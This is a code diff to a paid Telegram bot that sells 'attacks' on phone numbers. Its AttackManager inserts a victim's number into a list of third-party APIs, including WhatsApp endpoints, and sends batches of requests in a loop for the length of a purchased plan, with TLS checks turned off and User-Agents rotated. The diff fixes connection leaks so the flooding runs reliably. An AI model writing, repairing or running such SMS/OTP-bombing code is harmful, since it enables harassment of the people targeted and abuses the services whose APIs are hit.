@@ -147,7 +147,6 @@ PLANS = {
     "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
 }
 
-# ========== MONGODB STORAGE CLASS ==========
 # ========== SQLITE STORAGE CLASS ==========
 class SqliteStorage:
     """
@@ -2357,6 +2356,7 @@ class DatabaseWrapper:
 
 database = DatabaseWrapper()
 
+# ========== FIXED ATTACK MANAGER - NO MORE OPEN FILE LEAKS ==========
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
@@ -2373,89 +2373,131 @@ class AttackManager:
         self.ssl_context = ssl.create_default_context()
         self.ssl_context.check_hostname = False
         self.ssl_context.verify_mode = ssl.CERT_NONE
+        
+        # ✅ FIX 1: Single shared session with connection limits
+        self._session = None
+        self._connector = None
+    
+    async def _get_session(self):
+        """Get or create shared session with proper connection pooling."""
+        if self._session is None or self._session.closed:
+            # ✅ CRITICAL FIX: Limit connections to prevent "Too many open files"
+            self._connector = aiohttp.TCPConnector(
+                ssl=self.ssl_context,
+                limit=30,              # Max 30 total connections
+                limit_per_host=10,      # Max 10 per host
+                ttl_dns_cache=300,
+                enable_cleanup_closed=True,
+                force_close=False
+            )
+            timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
+            self._session = aiohttp.ClientSession(
+                connector=self._connector,
+                timeout=timeout
+            )
+        return self._session
+    
+    async def _close_session(self):
+        """Properly close session to free file descriptors."""
+        if self._session and not self._session.closed:
+            await self._session.close()
+        if self._connector and not self._connector.closed:
+            await self._connector.close()
+        self._session = None
+        self._connector = None
 
-    async def _make_request(self, session, api, phone):
+    async def _make_request(self, api, phone):
+        """Single request using shared session - NO NEW CONNECTIONS!"""
         try:
+            session = await self._get_session()
             url = api['url']
             
+            # Process params
             params = api.get('params', {}).copy() if api.get('params') else {}
             if params:
                 for k, v in params.items():
                     if isinstance(v, str):
                         params[k] = v.replace('{no}', phone)
             
+            # Process headers
             headers = api.get('headers', {}).copy()
             if 'User-Agent' not in headers:
                 headers['User-Agent'] = random.choice(self.user_agents)
-            timeout = aiohttp.ClientTimeout(total=10)
             
-            def replace_in_body(body):
+            # Process body
+            def replace_body(body):
                 if isinstance(body, dict):
-                    formatted = {}
-                    for k, v in body.items():
-                        if isinstance(v, str):
-                            formatted[k] = v.replace('{no}', phone).replace('{phone}', phone)
-                        elif isinstance(v, dict):
-                            formatted[k] = replace_in_body(v)
-                        elif isinstance(v, list):
-                            formatted[k] = [replace_in_body(item) if isinstance(item, dict) else (item.replace('{no}', phone) if isinstance(item, str) else item) for item in v]
-                        else:
-                            formatted[k] = v
-                    return formatted
+                    return {k: replace_body(v) if isinstance(v, (dict, list)) else 
+                           (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) 
+                           for k, v in body.items()}
+                elif isinstance(body, list):
+                    return [replace_body(item) if isinstance(item, (dict, list)) else 
+                           (item.replace('{no}', phone).replace('{phone}', phone) if isinstance(item, str) else item) 
+                           for item in body]
                 elif isinstance(body, str):
                     return body.replace('{no}', phone).replace('{phone}', phone)
-                else:
-                    return body
+                return body
             
-            body = api.get('body', {})
-            if body:
-                body = replace_in_body(body)
+            body = replace_body(api.get('body', {}))
             
-            if api['method'].upper() == 'GET':
-                async with session.get(url, headers=headers, params=params, timeout=timeout, ssl=self.ssl_context) as r:
-                    await r.text()
-                    return True
-            elif api['method'].upper() == 'PUT':
-                async with session.put(url, headers=headers, json=body, timeout=timeout, ssl=self.ssl_context) as r:
-                    await r.text()
-                    return True
+            # Make request with timeout
+            method = api['method'].upper()
+            if method == 'GET':
+                async with session.get(url, headers=headers, params=params) as resp:
+                    await resp.text()
+            elif method == 'PUT':
+                async with session.put(url, headers=headers, json=body) as resp:
+                    await resp.text()
             else:
                 if isinstance(body, dict):
-                    async with session.post(url, headers=headers, json=body, params=params, timeout=timeout, ssl=self.ssl_context) as r:
-                        await r.text()
-                        return True
+                    async with session.post(url, headers=headers, json=body, params=params) as resp:
+                        await resp.text()
                 else:
-                    async with session.post(url, headers=headers, data=body, params=params, timeout=timeout, ssl=self.ssl_context) as r:
-                        await r.text()
-                        return True
-        except Exception as e:
+                    async with session.post(url, headers=headers, data=body, params=params) as resp:
+                        await resp.text()
+            return True
+        except Exception:
             return False
 
     async def _worker_task(self, user_id, phone, api_list, end_time):
-        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=0)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            while time.time() < end_time:
-                if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]:
-                    break
-                if phone not in self.active_attacks[user_id]["targets"]:
-                    break
-                random.shuffle(api_list)
-                tasks = [self._make_request(session, api, phone) for api in api_list[:50]]
-                if tasks:
-                    await asyncio.gather(*tasks, return_exceptions=True)
-                await asyncio.sleep(0.05)
+        """Worker using shared session - REUSES connections!"""
+        while time.time() < end_time:
+            # Check if attack should stop
+            if user_id not in self.active_attacks:
+                break
+            if not self.active_attacks[user_id].get("running", False):
+                break
+            if phone not in self.active_attacks[user_id].get("targets", []):
+                break
+            
+            # ✅ FIX 2: Limit concurrent requests per batch
+            batch_size = min(15, len(api_list))  # Max 15 per batch
+            batch = random.sample(api_list, batch_size) if len(api_list) > batch_size else api_list
+            
+            # Create tasks using shared session
+            tasks = [self._make_request(api, phone) for api in batch]
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # ✅ FIX 3: Small delay to prevent overwhelming
+            await asyncio.sleep(0.15)
 
     async def start_attack(self, user_id, targets, duration_minutes):
+        """Start attack with connection limits."""
         if user_id in self.active_attacks:
             return False, "Attack already running"
+        
         if not await self.db.is_premium(user_id):
             return False, "Premium required"
+        
         max_dur = await self.db.get_max_duration(user_id)
         if duration_minutes > max_dur:
             return False, f"Max duration is {max_dur} minutes for your plan"
+        
         concurrency = await self.db.get_concurrent_limit(user_id)
         if concurrency == 0:
             return False, "Premium required"
+        
         if len(targets) > concurrency:
             return False, f"Your plan allows max {concurrency} concurrent targets"
         
@@ -2464,12 +2506,9 @@ class AttackManager:
                 return False, f"Number {target} is protected!"
         
         end_time = time.time() + (duration_minutes * 60)
-        chunk_size = max(1, len(APIS) // concurrency)
-        api_chunks = []
-        for i in range(concurrency):
-            start_idx = i * chunk_size
-            end_idx = start_idx + chunk_size if i < concurrency - 1 else len(APIS)
-            api_chunks.append(APIS[start_idx:end_idx])
+        
+        # ✅ FIX 4: Limit workers to prevent too many connections
+        max_workers = min(concurrency, 3)  # Max 3 workers per target
         
         self.active_attacks[user_id] = {
             "targets": targets,
@@ -2478,22 +2517,45 @@ class AttackManager:
             "workers": {}
         }
         
+        # Split APIs among workers
+        chunk_size = max(1, len(APIS) // max_workers)
+        api_chunks = []
+        for i in range(max_workers):
+            start = i * chunk_size
+            end = start + chunk_size if i < max_workers - 1 else len(APIS)
+            api_chunks.append(APIS[start:end])
+        
+        # Start workers for each target
         for target in targets:
             self.active_attacks[user_id]["workers"][target] = []
-            for i in range(concurrency):
-                task = asyncio.create_task(self._worker_task(user_id, target, api_chunks[i], end_time))
+            for i in range(max_workers):
+                task = asyncio.create_task(
+                    self._worker_task(user_id, target, api_chunks[i], end_time)
+                )
                 self.active_attacks[user_id]["workers"][target].append(task)
         
-        return True, f"Started attack on {len(targets)} target(s) with {concurrency}x workers each | {len(APIS)} APIs loaded"
+        return True, f"Started attack on {len(targets)} target(s)"
 
     async def stop_attack(self, user_id):
+        """Stop attack and cleanup connections."""
         if user_id in self.active_attacks:
+            # Stop all workers
             self.active_attacks[user_id]["running"] = False
+            
+            # Cancel all tasks
             for target_workers in self.active_attacks[user_id].get("workers", {}).values():
                 for task in target_workers:
                     if not task.done():
                         task.cancel()
+            
+            # Wait for tasks to finish
+            await asyncio.sleep(0.5)
+            
+            # Cleanup
             del self.active_attacks[user_id]
+            
+            # ✅ FIX 5: Close session to free file descriptors
+            await self._close_session()
             return True
         return False
     
@@ -2502,6 +2564,7 @@ class AttackManager:
             return self.active_attacks[user_id]["targets"]
         return []
 
+# ========== INITIALIZE ATTACK MANAGER ==========
 manager = AttackManager()
 
 # ========== FORCE CHANNEL JOIN SYSTEM ==========
@@ -2934,6 +2997,9 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def shutdown_handler(signal, loop):
     logger.info(f"Received exit signal {signal.name}...")
+    # Close attack manager session
+    if manager:
+        await manager._close_session()
     tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
     [task.cancel() for task in tasks]
     logger.info(f"Cancelling {len(tasks)} outstanding tasks")
@@ -2945,7 +3011,7 @@ def main():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    # Initialize MongoDB with correct loop
+    # Initialize SQLite with correct loop
     global db
     db = SqliteStorage(DB_PATH)
     
@@ -2995,7 +3061,7 @@ def main():
     logger.info(f"📱 WhatsApp APIs: Included")
     logger.info(f"👑 Admin Panel Ready")
     logger.info(f"🌐 Web Server Running on Port {PORT}")
-    logger.info(f"🗄️ Using MongoDB Storage")
+    logger.info(f"🗄️ Using SQLite Storage")
     logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
     logger.info("=" * 60)
     
